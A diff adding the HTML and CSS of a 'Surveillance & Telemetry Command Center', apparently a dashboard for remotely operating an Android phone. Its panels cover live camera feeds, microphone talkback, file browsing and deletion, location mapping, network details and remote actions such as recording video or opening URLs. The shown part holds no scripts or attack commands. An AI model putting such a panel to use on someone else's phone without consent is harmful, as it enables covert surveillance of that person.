@@ -1,0 +1,1334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance & Telemetry Command Center</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <!-- Leaflet Maps CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+    
+    <!-- Custom Style Sheet -->
+    <style>
+        :root {
+            --bg-base: #08090f;
+            --bg-surface: #111422cc;
+            --bg-card: rgba(22, 26, 46, 0.7);
+            --border-glow: rgba(0, 240, 255, 0.15);
+            --primary: #00f0ff;
+            --primary-glow: rgba(0, 240, 255, 0.4);
+            --secondary: #ec4899;
+            --secondary-glow: rgba(236, 72, 153, 0.4);
+            --success: #10b981;
+            --success-glow: rgba(16, 185, 129, 0.4);
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --font-main: 'Plus Jakarta Sans', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            --transition-smooth: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background-color: var(--bg-base);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(13, 20, 41, 0.8) 0, transparent 50%),
+                radial-gradient(at 50% 100%, rgba(20, 15, 38, 0.5) 0, transparent 50%),
+                radial-gradient(at 100% 0%, rgba(6, 30, 40, 0.7) 0, transparent 50%);
+            background-attachment: fixed;
+            color: var(--text-main);
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Custom Scrollbars */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(8, 9, 15, 0.5);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            border: 2px solid var(--bg-base);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-glow);
+        }
+
+        /* Glassmorphism Utility */
+        .glass-panel {
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            transition: var(--transition-smooth);
+        }
+
+        .glass-panel:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 12px 40px 0 rgba(0, 240, 255, 0.08);
+        }
+
+        /* Typography */
+        h1, h2, h3, h4 {
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
+
+        /* Top Navigation Header */
+        .nav-header {
+            padding: 16px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            background: rgba(8, 9, 15, 0.6);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .nav-logo-orb {
+            width: 14px;
+            height: 14px;
+            background: var(--primary);
+            border-radius: 50%;
+            box-shadow: 0 0 12px var(--primary);
+            animation: pulse-orb 2.5s infinite;
+        }
+
+        @keyframes pulse-orb {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.3); opacity: 0.5; }
+        }
+
+        .nav-logo-text {
+            font-size: 1.25rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff 0%, #a5b4fc 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-status {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .status-badge {
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px solid rgba(0, 240, 255, 0.25);
+            color: var(--primary);
+            padding: 6px 16px;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.05);
+        }
+
+        .btn-reconnect {
+            background: linear-gradient(135deg, var(--primary) 0%, #3b82f6 100%);
+            color: #05050a;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            box-shadow: 0 0 15px var(--primary-glow);
+            transition: var(--transition-smooth);
+            display: none;
+        }
+
+        .btn-reconnect:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px var(--primary);
+        }
+
+        /* Dashboard Workspace Container */
+        .dashboard-container {
+            display: grid;
+            grid-template-columns: 340px 1fr;
+            gap: 24px;
+            padding: 24px 32px;
+            flex: 1;
+        }
+
+        /* Sidebar: Devices & Controls */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .sidebar-widget {
+            padding: 24px;
+        }
+
+        .widget-title {
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Device Info Grid */
+        .info-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .info-item:last-child {
+            border: none;
+            padding: 0;
+        }
+
+        .info-label {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        .info-val {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        /* Smart Home Control Slider */
+        .control-group {
+            margin-bottom: 20px;
+        }
+
+        .control-group:last-child {
+            margin: 0;
+        }
+
+        .control-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .control-label {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .control-val {
+            font-size: 0.85rem;
+            color: var(--primary);
+            font-weight: 700;
+            font-family: var(--font-mono);
+        }
+
+        .control-slider {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 5px;
+            outline: none;
+            -webkit-appearance: none;
+            transition: var(--transition-smooth);
+        }
+
+        .control-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: var(--primary);
+            box-shadow: 0 0 8px var(--primary);
+            cursor: pointer;
+            transition: var(--transition-smooth);
+        }
+
+        .control-slider::-webkit-slider-thumb:hover {
+            transform: scale(1.25);
+        }
+
+        /* Toggle Switches */
+        .toggle-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+        }
+
+        .switch-container {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+        }
+
+        .switch-container input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .switch-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.08);
+            transition: .3s;
+            border-radius: 34px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .switch-slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+
+        input:checked + .switch-slider {
+            background-color: rgba(0, 240, 255, 0.2);
+            border-color: var(--primary-glow);
+        }
+
+        input:checked + .switch-slider:before {
+            transform: translateX(20px);
+            background-color: var(--primary);
+            box-shadow: 0 0 8px var(--primary);
+        }
+
+        /* Action Buttons Grid */
+        .btn-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-action {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: var(--text-main);
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition-smooth);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            text-align: center;
+        }
+
+        .btn-action svg {
+            width: 20px;
+            height: 20px;
+            stroke: var(--text-muted);
+            transition: var(--transition-smooth);
+        }
+
+        .btn-action:hover {
+            background: rgba(0, 240, 255, 0.05);
+            border-color: var(--primary-glow);
+            color: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .btn-action:hover svg {
+            stroke: var(--primary);
+            filter: drop-shadow(0 0 4px var(--primary-glow));
+        }
+
+        .btn-action.active {
+            background: rgba(236, 72, 153, 0.1);
+            border-color: var(--secondary-glow);
+            color: var(--secondary);
+        }
+
+        .btn-action.active svg {
+            stroke: var(--secondary);
+            filter: drop-shadow(0 0 4px var(--secondary-glow));
+        }
+
+        /* Core Panel Grid */
+        .main-workspace {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+        }
+
+        /* Live Feeds Layout */
+        .live-feeds-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        .feed-card {
+            display: flex;
+            flex-direction: column;
+            height: 380px;
+        }
+
+        .feed-header {
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .feed-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .feed-live-tag {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+            color: var(--danger);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 800;
+            letter-spacing: 0.05em;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .video-wrapper {
+            flex: 1;
+            background: #04050a;
+            border-radius: 0 0 20px 20px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .video-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Telemetry Cards Row */
+        .telemetry-row {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 24px;
+        }
+
+        .tab-card {
+            display: flex;
+            flex-direction: column;
+            height: 380px;
+        }
+
+        .tab-header {
+            padding: 12px 12px 0 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            gap: 8px;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            padding: 12px 18px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            border-radius: 12px 12px 0 0;
+            position: relative;
+            transition: var(--transition-smooth);
+        }
+
+        .tab-btn:hover {
+            color: var(--text-main);
+        }
+
+        .tab-btn.active {
+            color: var(--primary);
+            background: rgba(0, 240, 255, 0.03);
+        }
+
+        .tab-btn.active::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--primary);
+            box-shadow: 0 0 8px var(--primary);
+        }
+
+        .tab-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        /* Items Styles */
+        .data-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 14px;
+            padding: 14px 18px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            transition: var(--transition-smooth);
+        }
+
+        .data-item:hover {
+            border-color: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.04);
+            transform: translateX(4px);
+        }
+
+        .data-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50px;
+            background: rgba(0, 240, 255, 0.05);
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            flex-shrink: 0;
+        }
+
+        .data-details {
+            flex: 1;
+        }
+
+        .data-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 2px;
+        }
+
+        .data-desc {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            line-height: 1.3;
+        }
+
+        .data-time {
+            font-size: 0.75rem;
+            color: var(--primary);
+            font-weight: 600;
+            font-family: var(--font-mono);
+            flex-shrink: 0;
+        }
+
+        /* File Explorer Widget */
+        .explorer-card {
+            display: flex;
+            flex-direction: column;
+            height: 480px;
+        }
+
+        .explorer-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .explorer-input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 8px 16px;
+            color: var(--primary);
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            outline: none;
+            transition: var(--transition-smooth);
+        }
+
+        .explorer-input:focus {
+            border-color: var(--primary-glow);
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.05);
+        }
+
+        .btn-explorer {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: var(--text-main);
+            padding: 8px 16px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition-smooth);
+        }
+
+        .btn-explorer:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .btn-explorer.btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, #3b82f6 100%);
+            color: #05050a;
+            border: none;
+            box-shadow: 0 0 12px rgba(0, 240, 255, 0.25);
+        }
+
+        .btn-explorer.btn-primary:hover {
+            box-shadow: 0 0 20px var(--primary);
+        }
+
+        .explorer-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 12px 24px;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 14px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: var(--transition-smooth);
+            margin-bottom: 6px;
+            border: 1px solid transparent;
+        }
+
+        .file-item:hover {
+            background: rgba(255, 255, 255, 0.03);
+            border-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .file-icon {
+            font-size: 1.25rem;
+            margin-right: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .file-info {
+            flex: 1;
+        }
+
+        .file-name {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .file-size {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        .file-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-file-action {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 6px;
+            border-radius: 8px;
+            transition: var(--transition-smooth);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-file-action svg {
+            width: 16px;
+            height: 16px;
+            stroke: var(--text-muted);
+            transition: var(--transition-smooth);
+        }
+
+        .btn-file-action:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn-file-action.download:hover svg {
+            stroke: var(--primary);
+            filter: drop-shadow(0 0 4px var(--primary-glow));
+        }
+
+        .btn-file-action.delete:hover svg {
+            stroke: var(--danger);
+            filter: drop-shadow(0 0 4px rgba(239, 68, 68, 0.4));
+        }
+
+        /* Custom dialog popup */
+        .dialog-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(4, 5, 10, 0.85);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            display: grid;
+            place-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: var(--transition-smooth);
+        }
+
+        .dialog-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .dialog-box {
+            width: min(440px, 90vw);
+            padding: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .dialog-title {
+            font-size: 1.15rem;
+            margin-bottom: 12px;
+        }
+
+        .dialog-desc {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .dialog-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 12px 18px;
+            color: var(--text-main);
+            outline: none;
+            font-size: 0.85rem;
+            margin-bottom: 24px;
+            transition: var(--transition-smooth);
+        }
+
+        .dialog-input:focus {
+            border-color: var(--primary-glow);
+        }
+
+        .dialog-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+        }
+
+        /* Map and Debug Console Panel */
+        .bottom-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        .map-card {
+            height: 380px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .map-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        #mapContainer {
+            flex: 1;
+            border-radius: 0 0 20px 20px;
+            overflow: hidden;
+            background: #05060b;
+        }
+
+        #mapContainer .leaflet-tile {
+            filter: brightness(0.6) invert(1) contrast(3) hue-rotate(200deg) saturate(0.3) brightness(0.7);
+        }
+
+        /* Debug Console Terminal */
+        .terminal-card {
+            height: 380px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-header {
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .terminal-header-title {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .terminal-controls {
+            display: flex;
+            gap: 6px;
+        }
+
+        .terminal-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .terminal-dot:nth-child(1) { background: #ef4444; }
+        .terminal-dot:nth-child(2) { background: #f59e0b; }
+        .terminal-dot:nth-child(3) { background: #10b981; }
+
+        .terminal-body {
+            flex: 1;
+            padding: 20px;
+            background: #040508;
+            border-radius: 0 0 20px 20px;
+            overflow-y: auto;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            line-height: 1.6;
+            color: #a7f3d0;
+        }
+
+        .terminal-entry {
+            margin-bottom: 6px;
+            animation: fade-in 0.3s ease;
+        }
+
+        @keyframes fade-in {
+            from { opacity: 0; transform: translateY(4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Media Queries */
+        @media (max-width: 1200px) {
+            .dashboard-container {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 20px;
+            }
+        }
+
+        @media (max-width: 850px) {
+            .sidebar {
+                grid-template-columns: 1fr;
+            }
+            .live-feeds-grid, .telemetry-row, .bottom-grid {
+                grid-template-columns: 1fr;
+            }
+            .nav-header {
+                padding: 16px 20px;
+                flex-direction: column;
+                gap: 12px;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation Header -->
+    <header class="nav-header">
+        <div class="nav-logo">
+            <div class="nav-logo-orb"></div>
+            <span class="nav-logo-text">SURVEILLANCE COMMAND CENTER</span>
+        </div>
+        <div class="nav-status">
+            <button id="talkbackToggle" class="btn-explorer" style="margin-right: 12px; border-color: rgba(255,255,255,0.05); color: var(--text-muted);" title="Transmit microphone back to device">🎙️ Talkback OFF</button>
+            <div id="status" class="status-badge">Connecting to server...</div>
+            <button id="retryButton" class="btn-reconnect">Retry</button>
+        </div>
+    </header>
+
+    <!-- Main Workspace -->
+    <main class="dashboard-container">
+        
+        <!-- Left Sidebar (Device Info & Hardware Controls) -->
+        <aside class="sidebar">
+            
+            <!-- Widget 1: System Telemetry -->
+            <section class="glass-panel sidebar-widget">
+                <h3 class="widget-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z"/></svg>
+                    Device Metrics
+                </h3>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <span class="info-label">Model</span>
+                        <span id="infoModel" class="info-val">—</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Manufacturer</span>
+                        <span id="infoManufacturer" class="info-val">—</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Android Version</span>
+                        <span id="infoVersion" class="info-val">—</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Battery status</span>
+                        <div style="text-align: right;">
+                            <span id="infoBattery" class="info-val">—</span>
+                            <div id="infoBatteryDetails" style="font-size: 0.75rem; color: var(--text-muted); margin-top: 2px;">—</div>
+                        </div>
+                    </div>
+                    <div class="info-item" style="flex-direction: column; align-items: stretch; gap: 8px; border: none; padding-top: 10px;">
+                        <div style="display: flex; justify-content: space-between; font-size: 0.85rem;">
+                            <span class="info-label">Storage occupancy</span>
+                            <span id="storageText" class="info-val" style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--primary);">0 GB / 0 GB</span>
+                        </div>
+                        <div style="width: 100%; height: 6px; background: rgba(255,255,255,0.06); border-radius: 10px; overflow: hidden;">
+                            <div id="storageProgress" style="width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary) 0%, #3b82f6 100%); border-radius: 10px; transition: var(--transition-smooth);"></div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Widget 2: Home Automation-Style Hardware Toggles -->
+            <section class="glass-panel sidebar-widget">
+                <h3 class="widget-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M10.5 6h9.75M10.5 6a1.5 1.5 0 11-3 0m3 0a1.5 1.5 0 10-3 0M3.75 6H7.5m3 12h9.75m-9.75 0a1.5 1.5 0 01-3 0m3 0a1.5 1.5 0 00-3 0m-3.75 0H7.5m9-6h3.75m-3.75 0a1.5 1.5 0 01-3 0m3 0a1.5 1.5 0 00-3 0m-9.75 0h9.75"/></svg>
+                    Hardware Controls
+                </h3>
+                
+                <!-- Volume Control Slider -->
+                <div class="control-group">
+                    <div class="control-header">
+                        <span class="control-label">Music Volume</span>
+                        <span id="volumeVal" class="control-val">50%</span>
+                    </div>
+                    <input type="range" id="volumeSlider" class="control-slider" min="0" max="100" value="50">
+                </div>
+
+                <!-- Screen Brightness Control Slider -->
+                <div class="control-group">
+                    <div class="control-header">
+                        <span class="control-label">Screen Brightness</span>
+                        <span id="brightnessVal" class="control-val">50%</span>
+                    </div>
+                    <input type="range" id="brightnessSlider" class="control-slider" min="0" max="100" value="50">
+                </div>
+
+                <!-- Flashlight Toggle -->
+                <div class="toggle-row">
+                    <span class="control-label">Flashlight</span>
+                    <label class="switch-container">
+                        <input type="checkbox" id="flashlightToggle">
+                        <span class="switch-slider"></span>
+                    </label>
+                </div>
+
+                <!-- Video Quality Selector -->
+                <div class="control-group" style="margin-top: 15px;">
+                    <div class="control-header">
+                        <span class="control-label">Streaming Quality</span>
+                    </div>
+                    <select id="videoQualitySelect" class="explorer-input" style="width: 100%; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.05); padding: 8px 12px; border-radius: 12px; color: var(--primary); font-family: var(--font-main); outline: none; cursor: pointer;">
+                        <option value="low" style="background: var(--bg-base); color: var(--text-main);">Low (320x240 @ 10fps)</option>
+                        <option value="medium" selected style="background: var(--bg-base); color: var(--text-main);">Medium (640x480 @ 15fps)</option>
+                        <option value="high" style="background: var(--bg-base); color: var(--text-main);">High (1280x720 @ 30fps)</option>
+                    </select>
+                </div>
+            </section>
+
+            <!-- Widget 3: Quick Action Commands -->
+            <section class="glass-panel sidebar-widget">
+                <h3 class="widget-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M15.59 14.37a6 6 0 01-5.84 7.38v-4.8m5.84-2.58a14.98 14.98 0 006.16-12.12A14.98 14.98 0 009.64 8.38m6.06 6a14.96 14.96 0 01-12.12 6.16m12.12-6.16a14.96 14.96 0 00-6.16-12.12"/></svg>
+                    Quick Actions
+                </h3>
+                <div class="btn-grid">
+                    <button id="btnVibrate" class="btn-action" title="Trigger Haptic Pulse">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
+                        Vibrate
+                    </button>
+                    <button id="btnRing" class="btn-action" title="Play High Volume Ringtone">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"/></svg>
+                        Ring Siren
+                    </button>
+                    <button id="btnToast" class="btn-action" title="Display Popup Banner">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z"/></svg>
+                        Push Alert
+                    </button>
+                    <button id="btnOpenUrl" class="btn-action" title="Launch Web Browser Target">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                        Launch URL
+                    </button>
+                    <button id="btnSwitchCamera" class="btn-action" title="Flip Active Video Sinks">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+                        Flip Cam
+                    </button>
+                    <button id="btnRecord" class="btn-action" title="Start Local MP4 Session">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
+                        Record MP4
+                    </button>
+                </div>
+            </section>
+
+            <!-- Widget 4: Connection Analyzer -->
+            <section class="glass-panel sidebar-widget">
+                <h3 class="widget-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px;stroke:var(--primary)"><path stroke-linecap="round" stroke-linejoin="round" d="M8.284 16.284A3 3 0 0012 17a3 3 0 003.716-.716m-7.432-2.828A6 6 0 0012 15a6 6 0 005.716-1.544m-8.574-2.83A9 9 0 0012 13a9 9 0 007.142-2.388m-9.97-2.83A12 12 0 0012 11a12 12 0 008.568-3.238m-11.41-2.83A15 15 0 0012 9a15 15 0 009.996-3.478"/></svg>
+                    Connection Analyzer
+                </h3>
+                <div class="info-grid" style="margin-bottom: 12px;">
+                    <div class="info-item">
+                        <span class="info-label">SSID</span>
+                        <span id="netSsid" class="info-val">—</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Link Speed</span>
+                        <span id="netSpeed" class="info-val">—</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Local IP</span>
+                        <span id="netIp" class="info-val">—</span>
+                    </div>
+                    <div class="info-item" style="border: none; padding-bottom: 0;">
+                        <span class="info-label">RSSI Signal</span>
+                        <span id="netRssi" class="info-val">—</span>
+                    </div>
+                </div>
+                <button id="btnRefreshNetwork" class="btn-explorer btn-primary" style="width: 100%; box-shadow: none;">Analyze Connection</button>
+            </section>
+
